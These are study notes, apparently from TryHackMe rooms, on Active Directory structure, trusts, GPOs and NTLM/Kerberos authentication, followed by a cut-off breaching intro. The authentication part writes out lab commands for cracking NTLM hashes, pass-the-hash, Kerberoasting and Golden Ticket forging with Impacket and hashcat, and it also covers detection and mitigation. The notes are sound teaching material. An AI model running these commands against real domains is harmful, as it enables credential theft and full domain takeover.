> - The TGT's internal copy of the Session Key is why the KDC never needs separate Session Key storage — pure cryptographic convenience
> - NetNTLM: challenge-response, password/hash never crosses the network; domain accounts verify via DC round-trip, local accounts verify against the server's own local SAM
> - NetNTLM is legacy/obsolete in principle but typically still enabled for compatibility — a real attack surface worth remembering from the offensive side of this topic later

---

#### Trees, Forests, and Trusts

**Why multiple domains:** a single domain works initially, but as an org grows (new divisions, acquisitions, regional offices), one massive AD structure becomes hard to manage and more prone to misconfiguration.

**Trees** — multiple domains sharing the **same namespace**, joined together. Example: `thm.loc` (parent) + `tbm.thm.loc` (child, banking division) — each with its own DC managing its own resources independently, while still being part of the same tree. Can nest further (`us.tbm.thm.loc`, `uk.tbm.thm.loc`).

**Enterprise Admins group** — administrative privileges across **every domain in the enterprise** (the whole tree/forest), distinct from each domain's own **Domain Admins**, who only control their single domain.

**Forests** — domains in **different namespaces** joined together (e.g. integrating with an external vendor's own AD domain). Separate trees, joined at the forest level.

**Trust relationships** — what actually allows cross-domain resource access:

- **One-way trust** — if Domain AAA _trusts_ Domain BBB, a user **from BBB** can be authorised on **AAA**'s resources. The trust direction and the access direction run **opposite** each other
- **Two-way trust** — mutual authorisation both directions; this is what's created **by default** when domains join a tree/forest

> [!warning] Trust ≠ automatic access Establishing a trust relationship doesn't grant access to anything by itself — it only makes cross-domain authorisation **possible**. What's actually shared (which groups, which resources) is still configured deliberately afterward.

> [!summary] Quick Recap — Trees, Forests, Trusts
> 
> - Tree = same namespace, multiple domains; Forest = different namespaces, joined domains
> - Enterprise Admins spans the whole enterprise; Domain Admins is scoped to one domain only
> - Trust direction and access direction are opposite in a one-way trust — easy to get backwards when reasoning about it
> - A trust relationship is a prerequisite for cross-domain access, not the grant of access itself

---

#### Creating a New Domain (Child Domain, Hands-On)

**Scenario:** promoting a server to a DC for a new child domain, `tbm.thm.loc`, under the parent `thm.loc`.

**The promotion script's key steps** (`install-domain.ps1`):

1. **DNS** — point this server's DNS to the existing parent DC's IP, so it can locate and communicate with it
2. **Password reset** — the current local Administrator account becomes the new domain's Administrator account on promotion, so its password needs setting first
3. **Parent domain credentials** — promotion requires parent-domain privileges; a PSCredential object is built using the parent Administrator account
4. **Tool installation** — AD DS role/RSAT tools (already installed in this lab's case)
5. **`Install-ADDSDomain`** — the actual promotion, specifying the new domain name, NetBIOS name, database path, domain mode, and the parent FQDN it's joining under

```powershell
C:\install-domain.ps1
Restart-Computer -Force
```

> [!note] Post-promotion timing After reboot, AD configuration takes time to fully propagate — wait at least 5 minutes before reauthenticating. Credentials also change at this point: authentication moves from the local Administrator account to the **new domain's** `Administrator` account (`TBM.THM.LOC\Administrator`), since promotion converts the local account into the domain's.

> [!summary] Quick Recap — Creating a Child Domain
> 
> - Promotion requires: DNS pointed at the parent DC, a pre-set local Administrator password (which becomes the new domain's admin), and valid parent-domain credentials
> - `Install-ADDSDomain` with `-ParentDomainName` is what actually establishes the parent-child tree relationship
> - Post-reboot, both the authentication target (new domain, not local) and propagation timing (several minutes) need accounting for

---

#### Managing Users in AD — Delegation

**Advanced Features** (View menu in ADUC) — reveals additional containers and enables more operations (including object deletion).

**Delegation** — granting specific users advanced privileges over an OU **without** requiring Domain Admin involvement. Classic use case: letting IT support reset passwords for a specific department's OU.

**Workflow:** right-click the target OU → **Delegate Control** → specify the group/user to delegate to (use "Check Names" to avoid typos) → select the specific task (e.g. "Reset user passwords and force password change at next logon") → finish.

> [!note] Granularity available Beyond the built-in common tasks, a **custom task** can be delegated for highly granular control over exactly which permissions apply to which objects within an OU — not limited to the preset options.

> [!summary] Quick Recap — Delegation
> 
> - Delegation lets non-Domain-Admin users perform specific, scoped administrative tasks on an OU — password resets for a specific department is the textbook example
> - "Check Names" after typing a partial name avoids delegation-target typos
> - Custom delegated tasks allow fine-grained control beyond the built-in common-task presets

---

#### Domain-Joining a Computer and Managing AD Computers

**Joining a server to the domain** (`join-domain.ps1`):

1. **DNS** — point to the (child) domain's DC
2. **Credentials** — build a PSCredential for a domain account authorised to join computers (doesn't have to be Administrator, but commonly is in practice) — **this authorisation requirement itself is a security control**, since unrestricted domain-joining would be a major risk
3. **`Add-Computer`** — actually joins the domain using those credentials

```powershell
C:\join-domain.ps1
Restart-Computer -Force
```

Post-join, authentication switches from local credentials to domain credentials (`TBM.THM.LOC\Administrator`).

**Organising domain-joined computers:** all machines (except DCs) land in the default `Computers` container initially — not ideal, since servers and workstations typically need different policy sets. Common three-way split:

|Category|Description|
|---|---|
|**Workstations**|Standard user daily-use machines — **should never have a privileged user logged in**|
|**Servers**|Provide services to users/other servers|
|**Domain Controllers**|Manage the AD domain itself — the single most sensitive device class, since DCs store hashed passwords for every account in the environment|

Moving machines from the default `Computers` container into purpose-built `Servers`/`Workstations` OUs (drag-and-drop in ADUC) sets up for OU-scoped policy later.

> [!summary] Quick Recap — Domain-Joining and Computer Management
> 
> - Join script needs DNS pointed at the DC plus credentials for an account specifically authorised to add computers — not an open process
> - Default landing spot (`Computers` container) is rarely where machines should stay — reorganise into Workstations/Servers OUs for meaningful policy targeting
> - DCs are the single highest-value target in the environment — they hold every account's hashed password

---

#### Group Policies (GPOs)

**Group Policy Objects** — collections of settings applied to OUs, covering either **Computer Configuration** or **User Configuration** (or both). Managed via **Group Policy Management** (GPM), launched from Start.

**Linking** — a GPO applies to the OU it's linked to **and every sub-OU beneath it**. E.g. a GPO linked at the domain root still affects a deeply-nested `Bankers` OU underneath.

**Scope tab** — shows where a GPO is linked, plus **Security Filtering** (restrict the GPO to specific users/computers within the linked OU rather than everyone). Default filter target: **Authenticated Users** (i.e. everyone).

**Settings tab** — the actual configuration content, split between computer-only and user-only settings.

**Worked example — pushing local admin rights via GPO:**

Goal: make `Product Admins` group members local administrators on every server in the `Servers` OU.

1. Right-click `Servers` OU → **Create a GPO in this domain, and Link it here**
2. Name it, then right-click → **Edit**
3. Since this targets machines, navigate: **Computer Configuration → Policies → Windows Settings → Security Settings → Restricted Groups**
4. Add the `Product Admins` group (Browse → type "Product" → Check Names)
5. Configure: `Product Admins` should be added to the local **Administrators** group

**GPO distribution** — pushed via the **SYSVOL** network share on the DC (`C:\Windows\SYSVOL\sysvol\` by default). Domain members sync periodically — **up to 2 hours** for a change to propagate naturally. Force immediate sync on a specific machine:

```powershell
gpupdate /force
```

**Verification:** once applied, a `Product Admins` member (e.g. `terry.fox`) should be able to RDP into the target server directly, confirming the GPO-granted local admin rights took effect.

> [!summary] Quick Recap — Group Policies
> 
> - A GPO applies to its linked OU **and everything beneath it** — not just the directly linked level
> - Restricted Groups (Computer Configuration → Security Settings) is the mechanism for pushing group-membership changes (like local admin rights) via policy rather than manual configuration per machine
> - `gpupdate /force` forces immediate sync on one machine instead of waiting up to 2 hours for natural propagation
> - SYSVOL is the actual distribution mechanism underlying all GPO delivery — worth knowing by name, it recurs as an attack surface later in AD-focused offensive material

---

#### Foreign Forest Trust

**Scenario:** establishing bidirectional trust between two separate forests (`thm.loc` and `tvm.loc`, a partner vendor) to allow cross-company resource sharing.

**Setup via Active Directory Domains and Trusts** (from Start menu), on the `tvm.loc` DC:

1. Right-click the domain → **Properties → Trusts → New Trust**
2. Provide the other domain's name (`thm.loc`)
3. Select **Forest Trust** (appropriate since both forests are under administrative control here)
4. Select **Two-way trust** (resources need sharing in both directions)
5. Since credentials for both sides are available, configure the trust for **both domains in one pass**, supplying the other domain's admin credentials
6. Select **Forest-wide authentication** for both directions
7. Confirm both outgoing and incoming trust

**Sharing resources once trust exists** — e.g. granting a `thm.loc` user (`Claire`) admin access to a `tvm.loc` server via group membership:

1. In `tvm.loc`'s ADUC, open the relevant group (`Server Admins`) → **Properties → Members → Add**
2. Specify the foreign-domain account explicitly: `THM\Claire` (the domain prefix is required to indicate Claire isn't a `tvm.loc` native account)

**Result:** `THM\Claire` authenticates directly to the `tvm.loc` server using her **own domain's credentials** — the trust relationship is what makes this resolution possible at all.

#### Bidirectional Trust Extends Through Parent-Child Relationships

Because `thm.loc` and `tbm.thm.loc` are already in a parent-child relationship within the **same forest** (with intrinsic bidirectional trust between them), and a **new** bidirectional trust now exists between `thm.loc` and `tvm.loc`, **trust transitively extends** between `tvm.loc` and `tbm.thm.loc` as well — even though no trust was configured directly between those two.

**Demonstrated chain, traced precisely:**

1. `alice.king` is managed in `tvm.loc`
2. Bidirectional trust exists: `tvm.loc` ↔ `thm.loc` (just configured)
3. Intrinsic bidirectional trust exists: `thm.loc` ↔ `tbm.thm.loc` (parent-child, same forest)
4. Therefore: `tvm.loc` ↔ `tbm.thm.loc` trust exists transitively
5. `Product Admins` is managed in `tbm.thm.loc`, and a GPO (configured earlier) grants `Product Admins` local admin rights on every server in the `Servers` OU
6. Adding `tvm\alice.king` to `tbm.thm.loc`'s `Product Admins` group is therefore possible (the transitive trust permits it) — and immediately grants her local admin rights on `Server1`

**Confirming this is possible before acting** — switching the viewed domain in ADUC (right-click `tbm.thm.loc` → **Change Domain** → select `tvm.loc`) lets you view the entire `tvm.loc` domain directly from the `tbm.thm.loc` DC, confirming the trust path is live before adding the foreign account to a local group.

> [!warning] This is exactly the kind of chain an attacker looks for too Nothing in this chain required breaking anything — every step was a legitimate, individually-reasonable administrative action (a trust for a business partnership, a GPO for operational convenience, a group membership for a specific access need). **The combination of individually-reasonable configurations across domain boundaries is precisely how unintended privilege paths emerge in real AD environments** — the same principle covered conceptually in the Exploitation and Weaponisation room's vulnerability-chaining discussion, here demonstrated as a legitimate administrative capability that's equally exploitable from an attacker's perspective once any single link in the chain (one account, one domain) is compromised.

> [!summary] Quick Recap — Foreign Forest Trust
> 
> - Forest Trust + Two-way, configured for both sides at once when credentials for both are available
> - Cross-domain group membership requires the explicit `DOMAIN\username` prefix to resolve a foreign account correctly
> - Trust is **transitive** through parent-child relationships within a forest — a new trust to one domain can silently extend reach into every domain intrinsically trusted by that domain already
> - "Change Domain" in ADUC lets you verify a transitive trust path is actually live before relying on it

---

> [!summary] Full Active Directory Basics Room — One Glance
> 
> - AD centralises identity (users, machines, groups — all security principals) and policy (via OUs) for networks too large to manage per-machine
> - OUs apply policy (one per user); Security Groups grant resource permissions (many per user) — genuinely different purposes despite both "organising" users
> - Kerberos (TGT → TGS → service) is the modern default; NetNTLM (challenge-response, DC-verified for domain accounts) persists for legacy compatibility
> - Trees (same namespace) and Forests (different namespaces) scale AD beyond a single domain; trust relationships (one-way or two-way) are what actually permit cross-domain access — and trust is transitive through parent-child relationships within a forest
> - Real hands-on build: promote a child domain → delegate OU control → domain-join a computer → organise computers into Workstations/Servers OUs → push config via GPO (Restricted Groups for local admin rights) → establish cross-forest trust → observe how that trust transitively reaches further than directly configured
> - The final foreign-trust chain is the room's central lesson: individually reasonable administrative decisions, combined across domain/forest boundaries, can produce privilege paths nobody explicitly intended — a pattern worth recognising both as an admin and as an attacker
### Intro to AD Authentication

> [!info] Room context Deep dive into **how** AD authentication actually works mechanically — the foundation nearly every AD-focused attack (credential harvesting, relay attacks, ticket-based exploitation, covered in later rooms) targets. Covers NTLM and Kerberos at the protocol level, hands-on authentication via Impacket for both, and a practical preview of four real attacks against each protocol's weaknesses. Network: `thm.loc`, target `SERVER1.thm.loc` / `192.168.11.51`.

#### Authentication in AD

**Authentication, precisely:** proving identity — "are you who you claim to be?"

**Authentication material, three forms:**

- **Username + password** — most common, "something you know"
- **Certificates** — cryptographic, issued by a trusted CA; common for machine auth or smart card login
- **Hashes** — not intended for direct use, but usable for authentication in certain attacks (Pass-the-Hash, covered later in this room)

**Authentication vs. Authorisation — a critical, frequently conflated distinction:**

- **Authentication** — "You are John" (identity verification)
- **Authorisation** — "John has access to the finance share" (permission determination)

**Authentication always comes first** — the domain verifies identity before any authorisation check (group membership, ACLs) can even run.

**The two core AD authentication protocols:**

- **NetNTLM (NTLM)** — challenge-response, dating to early Windows NT
- **Kerberos** — ticket-based, default since Windows 2000, the preferred modern method

> [!note] Other protocols ultimately rely on these two Certificate-based TLS/SSL (smart card login) still results in a **Kerberos ticket** being issued for actual domain-resource authentication afterward — the certificate proves identity, Kerberos handles the session. Similarly, LDAP, WebDAV, SMB are service/directory-access protocols — their underlying authentication is handled by NTLM or Kerberos, not implemented independently. **Nearly every AD attack targets a weakness in one of these two protocols specifically**, which is why understanding them precisely matters more than memorising the service-layer protocol names.

> [!summary] Quick Recap — Authentication in AD
> 
> - Authentication (identity) always precedes authorisation (permissions) — never the reverse
> - Credentials, certificates, and hashes are all valid authentication material forms — hashes specifically become attack-relevant later
> - NTLM and Kerberos are the two foundational protocols; everything else (LDAP, SMB, WebDAV) authenticates through one of these underneath

---

#### NetNTLM Authentication

**What it is:** challenge-response protocol from early Windows NT. Largely superseded by Kerberos as default, but still widely present — legacy systems, workgroup environments, Kerberos-unavailable fallback. Two versions: **NTLMv1** (now highly insecure) and **NTLMv2** (stronger crypto, still vulnerable to various attacks).

**Key architectural difference from Kerberos:** the client authenticates **to the service itself**, which then verifies the user's identity with the DC — not to the DC first.

**Authentication flow:**

1. Client requests service access, provides username
2. Server generates a random 16-byte **challenge** (nonce), sends to client
3. Client encrypts the challenge using their **NT hash**, sends the response back
4. Server forwards username + original challenge + client's response to the DC
5. DC retrieves the user's NT hash, independently encrypts the same challenge
6. DC compares its own result to the client's response — match = success
7. Server grants/denies access per the DC's verdict

> [!note] Zero-knowledge proof The user's actual password **never crosses the network** — only the encrypted response to the challenge. Proving knowledge of the password without revealing it is precisely what makes this a zero-knowledge proof pattern.

**Benefits:** simple to implement (no KDC infrastructure needed), no time synchronisation required, reliable Kerberos fallback, works in non-domain workgroups.

**Drawbacks:**

- **No mutual authentication** — the client can't verify the server's identity, opening MITM attacks
- **Weak cryptography** — NTLMv1 uses DES + unsalted hashes (fast to crack); even NTLMv2 stores unsalted hashes in memory
- **Relay attacks** — intercepted authentication can be relayed to a different service
- **Pass-the-hash** — since the NT hash is used **directly** in the challenge-response, possessing the hash is functionally equivalent to knowing the password
- **Slower** — every authentication requires a DC round-trip

**When NTLM gets used even in a modern, Kerberos-default environment:**

- Client can't reach a DC for a Kerberos ticket
- Accessing a resource by **IP address** rather than hostname (Kerberos needs an SPN, which is DNS-tied)
- Target service has no registered SPN in AD
- Authenticating to non-domain-joined systems
- Legacy applications requiring NTLM specifically

**Hands-on — NTLM authentication with Impacket's `smbclient.py`:**

```bash
smbclient.py thm.loc/claire:'Password123!'@192.168.11.51
```

```
shares             # list available shares
use SHARE1          # connect to a share
```

**Behind the scenes:** username sent → challenge received → challenge encrypted with the NT hash → credentials forwarded to the DC → access granted on successful verification — the exact flow described above, happening live.

> [!summary] Quick Recap — NetNTLM
> 
> - Client authenticates _to the service_, which checks with the DC — the reverse of Kerberos's architecture
> - Password/hash never transmitted directly — only the challenge response (zero-knowledge proof)
> - IP-based access, no-SPN services, and non-domain-joined targets all force NTLM even in a Kerberos-default environment
> - Pass-the-hash works precisely because NTLM uses the raw NT hash in its challenge-response — the hash _is_ functionally the credential

---

#### Kerberos Authentication

**What it is:** MIT-developed, Microsoft-default since Windows 2000, ticket-based, authenticates through a trusted third party — the **KDC** (Key Distribution Center). Named after the three-headed guard dog of Greek mythology.

**Key architectural difference from NTLM:** authenticate **to the KDC first**, receive tickets, then present those tickets to services — the reverse of NTLM's client-to-service-first flow.

**Key components:**

|Component|Role|
|---|---|
|**KDC**|Service on the DC handling all ticket requests — composed of AS + TGS|
|**AS (Authentication Service)**|Verifies identity, issues the initial TGT|
|**TGS (Ticket Granting Service)**|Issues service tickets to holders of a valid TGT|
|**TGT (Ticket Granting Ticket)**|Initial "primary ticket" from successful authentication, used to request further service tickets|
|**ST (Service Ticket)**|Grants access to one specific service, obtained by presenting a TGT to the TGS|
|**SPN (Service Principal Name)**|Unique identifier linking a service instance to a specific account|
|**KRBTGT account**|Special account whose password hash encrypts **all** TGTs domain-wide — compromise enables Golden Ticket forgery|

**Full authentication flow — 5 steps, 8 sub-processes:**

**Step 1 — AS-REQ:**

1. User enters credentials locally
2. Client sends AS-REQ to the KDC: username + a timestamp encrypted with the user's password hash (this is **pre-authentication**)

**Step 2 — AS-REP:** 3. KDC decrypts the timestamp using the user's AD-stored password hash to verify identity 4. KDC responds with: a **session key** (encrypted with the user's password hash, client-decryptable) + a **TGT** (encrypted with the KRBTGT hash — **not** decryptable by the client, only by the KDC)

**Step 3 — TGS-REQ:** 5. To access a service, client sends TGS-REQ: the TGT + the target SPN + an **authenticator** (username+timestamp encrypted with the session key)

**Step 4 — TGS-REP:** 6. KDC decrypts the TGT (using the KRBTGT hash), validates, and responds with: a **Service Ticket** (encrypted with the target service's own password hash) + a **service session key** (encrypted with the original session key)

**Step 5 — AP-REQ:** 7. Client presents the Service Ticket directly to the target service 8. Service decrypts it using its own password hash, validates identity, grants access

> [!note] Why the TGT is opaque to the client The client receives the TGT but can **never** decrypt it — only the KDC (holding the KRBTGT hash) can. This is precisely why a stolen TGT is still useful to an attacker (it can be _presented_, replayed) but doesn't leak its own contents even if intercepted — the security boundary is enforced by the KDC being the only holder of the decryption key, not by the ticket being hidden.

**Benefits over NTLM:**

- **Mutual authentication** — both sides verify each other, defeating MITM
- **No password transmission** — only encrypted tickets/session keys cross the wire
- **SSO** — one TGT, many services, no re-entering credentials
- **Delegation support** — services can act on a user's behalf for further resource access
- **Better performance** — KDC contacted only at initial auth + new-service-ticket requests; services validate tickets locally afterward
- **Time-limited tickets** — typically 10-hour TGT lifetime, bounding an attacker's window

**Drawbacks:**

- **Time synchronisation required** — clocks must align within ~5 minutes, or authentication fails
- **Single point of failure** — KDC unavailable = Kerberos authentication entirely fails (NTLM fallback may apply)
- **Ticket theft attacks** — stolen tickets enable Pass-the-Ticket; a compromised KRBTGT hash enables Golden Tickets (domain-wide forgery)
- **Kerberoasting** — service tickets, encrypted with service-account password hashes, can be requested by **any** authenticated user and cracked offline
- **Deployment complexity** — proper SPN registration, DNS config, and time sync all required

**Credential cache (ccache) files — Linux-side ticket storage:**

- Default location: `/tmp/krb5cc_%{uid}`
- `KRB5CCNAME` environment variable specifies which ccache file is active
- `klist` displays stored tickets
- Impacket tools can authenticate directly from a ccache file, no password needed

> [!warning] ccache files enable Pass-the-Ticket / Pass-the-ccache If an attacker obtains a user's ccache file, they can authenticate **as that user with zero knowledge of their password** — functionally equivalent to Pass-the-Hash, but at the ticket layer instead of the hash layer.

**Hands-on — obtaining and using a TGT with Impacket:**

```bash
# Kerberos relies on DNS/SPNs — hardcode the hostname first
echo 192.168.11.51 SERVER1.thm.loc >> /etc/hosts

# Request a TGT, saved to a ccache file
getTGT.py thm.loc/mary:'SuperLongForKerberos123!' -dc-ip 192.168.11.100
# [*] Saving ticket in mary.ccache

# Point Kerberos tooling at the ccache
export KRB5CCNAME=mary.ccache

# Authenticate using the ticket, no password
smbclient.py thm.loc/mary@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
```

- `-k` → use Kerberos authentication
- `-no-pass` → authenticating via ticket, not a password
- `-dc-ip` → needed since DNS isn't functional in this lab for locating the KDC automatically

> [!warning] Hostname, not IP, for Kerberos — always SPNs are tied to DNS names. Connecting by IP address forces a silent fallback to NTLM — this is one of the "when NTLM gets used anyway" scenarios from the previous section, directly demonstrated here.

**Behind the scenes:** the ccache-stored TGT requests a Service Ticket from the KDC → KDC issues the ST for the SMB service → client presents the ST to the target → target validates and grants access.

> [!summary] Quick Recap — Kerberos
> 
> - Client authenticates to the KDC first (AS-REQ/AS-REP → TGT), then presents tickets to services (TGS-REQ/TGS-REP → ST → AP-REQ) — opposite order from NTLM
> - The TGT is opaque to the client by design — only the KDC (via the KRBTGT hash) can decrypt it, which is exactly why KRBTGT compromise is catastrophic (Golden Tickets)
> - ccache files are the Linux-side ticket store — stealing one enables Pass-the-Ticket with zero password knowledge
> - Always use hostname, never IP, for Kerberos — IP access forces an NTLM fallback silently

---

#### Weaknesses in AD Authentication

Both protocols, despite being functional and widely deployed, carry significant exploitable weaknesses — decades-old issues still actively exploited in real environments. Credential-based attacks account for the majority of successful AD compromises per current threat intelligence; Microsoft has announced eventual NTLM deprecation, though full transition will take years.

**NTLM-specific weaknesses:**

- **Weak cryptography** — unsalted MD4 hashing, vulnerable to rainbow tables and rapid GPU brute-forcing
- **Pass-the-Hash (PtH)** — the hash itself authenticates, no plaintext needed
- **NTLM relay** — intercepted auth attempts relayed to a different service entirely
- **Downgrade attacks** — forcing a Kerberos-capable system to fall back to NTLM
- **No mutual authentication** — MITM remains straightforward

**Kerberos-specific weaknesses:**

- **Kerberoasting** — any authenticated user can request service tickets for SPN-registered accounts, crack offline
- **AS-REP Roasting** — accounts with pre-authentication disabled leak crackable hashes with **zero** prior domain authentication
- **Pass-the-Ticket (PtT)** — extracted tickets reused to impersonate their owner
- **Overpass-the-Hash** — an NTLM hash used to request a _Kerberos_ TGT, converting one credential type into the other
- **Golden Ticket** — KRBTGT hash compromise → forge TGTs for **any** user, including Domain Admins, complete and persistent domain control
- **Silver Ticket** — same idea scoped to a single service account's hash, forging service tickets without ever contacting the KDC

**Configuration-based weaknesses:**

- **Weak passwords** — still the single most common actual entry point, regardless of protocol strength
- **Password spraying** — common passwords tried across many accounts, often evading lockout policies by design
- **Misconfigured delegation** — constrained/unconstrained Kerberos delegation errors enabling privesc/lateral movement
- **Stale credentials** — old service/former-employee/unused machine accounts with unrotated weak passwords

#### Practical Demonstrations — Four Attacks

Each authenticates to `SERVER1.thm.loc` (`192.168.11.51`) with different compromised credential types to retrieve a flag. Full depth on each is covered in dedicated later rooms — this is the preview.

#### 1. Weak Password Hashing (Cracking NTLM Hashes)

**Why it works:** NTLM hashes are unsalted, computed with the fast MD4 algorithm — identical passwords always produce identical hashes, and modern GPU-accelerated cracking (Hashcat) processes billions of NTLM candidates per second.

```bash
# NTLM hash format: username:uid:LM_hash:NTLM_hash:::
# phillip:1106:aad3b435b51404eeaad3b435b51404ee:939B0058BC6DD834ABC4CC08CFEFEA69:::

echo "939B0058BC6DD834ABC4CC08CFEFEA69" > hash.txt
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hash.txt --show
```

```bash
smbclient.py "thm.loc/phillip:<RECOVERED_PASSWORD>"@192.168.11.51
```

→ `SHARE3` → `flag3.txt`

#### 2. Pass-the-Hash

**Why it works:** NTLM's challenge-response uses the hash **directly** — the plaintext password is never used again after initial hashing, so the hash alone authenticates, regardless of password strength.

```bash
smbclient.py thm.loc/ben@192.168.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:63CF41DC25C04B8FB79E44B1DEF12C10
```

`-hashes` format: `LM_hash:NTLM_hash` — the empty LM hash constant `aad3b435b51404eeaad3b435b51404ee` is standard, since LM hashes are essentially unused in modern environments, followed by the real NTLM hash. → `SHARE4` → `flag4.txt`

> [!warning] Even an uncrackable password offers zero protection here Pass-the-Hash doesn't care about password strength at all — it bypasses the password entirely. A hash obtained via memory extraction (Mimikatz) or relay attacks is just as usable regardless of how complex the underlying password actually was.

#### 3. Kerberoasting

**Why it works:** service tickets are encrypted with the **service account's** password hash, and _any authenticated domain user_ can request a ticket for _any_ SPN-registered service — including ones they have no real need to access. Service account passwords are frequently weak/unrotated, making the offline-crackable ticket a real path to recovering those credentials.

```bash
GetUserSPNs.py thm.loc/claire:'Password123!' -dc-ip 192.168.11.100 -request
```

Output includes a `$krb5tgs$23$...` formatted ticket, ready for Hashcat.

```bash
# save the $krb5tgs$ ticket to service_ticket.txt
hashcat -m 13100 service_ticket.txt /usr/share/wordlists/rockyou.txt
```

```bash
smbclient.py "thm.loc/svc_printer:<RECOVERED_PASSWORD>"@192.168.11.51
```

→ `SHARE5` → `flag5.txt`

> [!note] Why service accounts specifically Service accounts are frequently more privileged than regular users (by design, for their service role) and far less likely to have password rotation enforced — a weak service account password cracked via Kerberoasting is often a meaningfully higher-value compromise than an equivalent regular user account.

#### 4. Golden Ticket

**Why it works:** every TGT domain-wide is encrypted/signed with the **KRBTGT account's** password hash. An attacker holding that hash can forge TGTs for **any user, including Domain Admins**, without their actual credentials — and the forged tickets are accepted by DCs as legitimate, virtually indistinguishable from real ones.

```bash
ticketer.py -nthash e9a9871b93d7b4d73c91665bd6df6e50 -domain-sid S-1-5-21-990021728-513958382-3715561918 -domain thm.loc Administrator
```

```bash
export KRB5CCNAME=Administrator.ccache
smbclient.py thm.loc/Administrator@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
```

→ `SHARE6` → `flag6.txt` (hostname required, per the Kerberos rule established earlier)

> [!warning] Why Golden Tickets are uniquely dangerous They remain valid **even after the original compromise vector is patched** — persistence survives until the KRBTGT password is reset **twice** (the previous password stays cached and valid for one rotation). This is the single most severe authentication compromise possible in an AD environment — complete and durable domain control from one stolen hash.

> [!summary] Quick Recap — The Four Attacks
> 
> - Weak hashing → crack the NT hash offline (Hashcat `-m 1000`), authenticate normally with the recovered password
> - Pass-the-Hash → skip cracking entirely, authenticate with the raw hash via `-hashes LM:NTLM`
> - Kerberoasting → any authenticated user requests SPN service tickets, crack offline (Hashcat `-m 13100`) — service accounts are high-value, often-weak targets
> - Golden Ticket → KRBTGT hash compromise forges TGTs for anyone, domain-wide, surviving a single password reset — the most severe of the four
> - All four converge on the same underlying lesson: protocol design flaws + weak/exposed credentials, not sophisticated zero-days, are what actually compromises most AD environments

---

#### Detection & Mitigation

**Key Windows Event IDs:**

|Event ID|Log|What It Shows|
|---|---|---|
|**4624**|Security|Successful logon — check Authentication Package + Logon Type|
|**4625**|Security|Failed logon — useful for password spraying detection|
|**4768**|Security|Kerberos TGT requested|
|**4769**|Security|Kerberos service ticket requested — key for Kerberoasting detection|
|**4771**|Security|Kerberos pre-authentication failed — useful for AS-REP Roasting / brute force detection|

**Detecting NTLM-based attacks via 4624:**

- **Authentication Package** field: `NTLM` vs. `Kerberos` — the direct protocol tell
- **Logon Type: 3** — network logon, typical of Pass-the-Hash via WinRM/SMB
- **Source Network Address: blank** — a distinctive NTLM quirk; the equivalent Kerberos events (4768/4769) **do** populate the client address, making NTLM logons comparatively harder to attribute

> [!warning] A specific, actionable detection signal An NTLM network logon (Type 3) against a high-value target like a Domain Controller is a strong Pass-the-Hash indicator — this specific combination is worth alerting on directly, not just logging passively.

**Detecting Kerberoasting via 4769:**

- **Volume spike** — many 4769 events from a single account in a short window, often across multiple service accounts
- **Ticket Encryption Type: `0x17` (RC4-HMAC)** vs. the modern default `0x12` (AES-256) — an RC4 request from an account that _supports_ AES is a strong downgrade-for-faster-cracking signal, since RC4 is far cheaper to crack offline than AES

**AS-REP Roasting / brute-force detection via 4771:** a spike of pre-authentication failures across **many different accounts** in a short window — either an attacker probing for accounts with pre-auth disabled, or a brute-force sweep.

**Mitigations, mapped directly to each attack:**

|Attack|Mitigation|
|---|---|
|Pass-the-Hash|Add privileged accounts to the **Protected Users** group; disable NTLM wherever Kerberos is viable|
|NTLM Relay|Enforce **SMB signing**; enable **Extended Protection for Authentication (EPA)** on LDAP and AD CS|
|Kerberoasting|Strong/random service account passwords, or migrate to **Group Managed Service Accounts (gMSA)**|
|Golden Ticket|Protect the KRBTGT account directly; **reset its password twice** after any suspected compromise|
|Password Spray|Account lockout policies; monitor 4625 for repeated failures spread across many accounts|

> [!summary] Quick Recap — Detection & Mitigation
> 
> - 4624's blank Source Network Address on NTLM logons is a genuine attribution gap compared to Kerberos's always-populated client address field
> - NTLM Type-3 logon against a DC specifically is a high-signal Pass-the-Hash indicator worth direct alerting
> - Encryption downgrade (AES-capable account requesting RC4) is a specific, actionable Kerberoasting tell beyond just volume
> - Every mitigation maps 1:1 to a specific attack from this room — gMSA for Kerberoasting, Protected Users + NTLM disablement for PtH, double KRBTGT reset for Golden Ticket recovery

---

> [!summary] Full Intro to AD Authentication Room — One Glance
> 
> - Authentication (identity) always precedes authorisation (permissions) — the foundational distinction underlying everything else
> - NTLM: client-authenticates-to-service-first, challenge-response, password/hash never transmitted directly, but the hash itself is a valid credential (enabling PtH)
> - Kerberos: client-authenticates-to-KDC-first, ticket-based (TGT → ST), mutual authentication, but KRBTGT compromise is catastrophic and domain-wide (Golden Ticket)
> - Four demonstrated attacks — weak hash cracking, Pass-the-Hash, Kerberoasting, Golden Ticket — each exploits a specific, named protocol weakness, not a generic "hacking" technique
> - Detection centres on five Event IDs (4624/4625/4768/4769/4771); specific field values (blank Source Address on NTLM, RC4 downgrade on Kerberoasting) are more actionable than raw event counts alone
> - Every mitigation in this room maps directly to one specific attack — there's no single fix, defence here is layered and attack-specific
### Intro to AD Breaching

> [!info] Room context Everything in AD starts with that first valid credential — no enumeration, no lateral movement, no escalation without it. **Breaching** is the process of obtaining that initial foothold from nothing but network access. This room works through the full natural progression: OSINT/recon → credential discovery in exposed services → username enumeration + password spraying → authentication coercion → mitigations mapped to every technique.

> [!info] Lab environment `thm.loc` domain — `ROOTDC` (DC), `SERVER1` (file server, writable SMB share), `WRK` (workstation), and a `WebServer` hosting Gitea (`git.thm.loc`), Jenkins (`ci.thm.loc`), and a network printer (`printer.thm.loc`) behind Nginx. Point DNS at the DC (`192.168.12.100`) for full functionality, including SRV record lookups — `/etc/hosts` works for most exercises but can't resolve SRV records.

#### Active Directory Breaching — Overview

**AD breaching, precisely:** obtaining an initial set of valid AD credentials from scratch — the very first phase of any AD attack chain. Without it: no domain enumeration, no lateral movement, no privilege escalation.

**Why even low-privileged credentials matter so much:** a standard domain user can't touch sensitive servers or modify AD objects directly — but **any** authenticated account can query AD for users, groups, computers, GPOs, and trust relationships, all hidden from unauthenticated access. This initial enumeration routinely reveals the misconfigurations and attack paths leading all the way to Domain Admin. **The hardest part is almost always just the first foothold**, not what comes after.

**The AD attack surface, by service:**

|Service|Port|Relevance|
|---|---|---|
|SMB|445|File shares, printers, remote admin — frequent password-spraying/credential-testing target|
